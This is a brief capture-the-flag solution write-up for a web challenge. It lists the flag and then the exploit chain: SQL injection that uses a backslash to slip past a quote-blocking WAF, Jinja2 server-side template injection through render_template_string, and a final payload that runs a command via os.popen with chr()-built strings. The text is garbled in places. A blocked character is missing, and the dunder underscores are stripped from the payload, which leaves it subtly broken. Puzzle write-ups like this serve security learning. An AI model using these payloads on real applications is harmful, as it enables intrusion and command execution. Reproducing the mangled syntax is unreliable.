FLAG: uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}
Exploit Summary:
Vulnerability Chain:

SQL Injection via Backslash Escape - The WAF blocks ' and " but not . Using username=\ escapes the closing quote, allowing injection in the password field: ) UNION SELECT 1,<payload>-- -
SSTI (Server-Side Template Injection) - The username from SQL is passed directly to render_template_string(), enabling Jinja2 template injection
RCE via builtins.chr - Accessed 
chr()
 function through cycler.init.globals.builtins.chr to build command strings without quotes, then executed via os.popen()
Final Payload:

```jinja2
{%set c=cycler.init.globals.builtins.chr%}{%set o=cycler.init.globals.os%}{{o.popen(c(47)+c(114)+c(101)+c(97)+c(100)+c(102)+c(108)+c(97)+c(103)).read()}}
```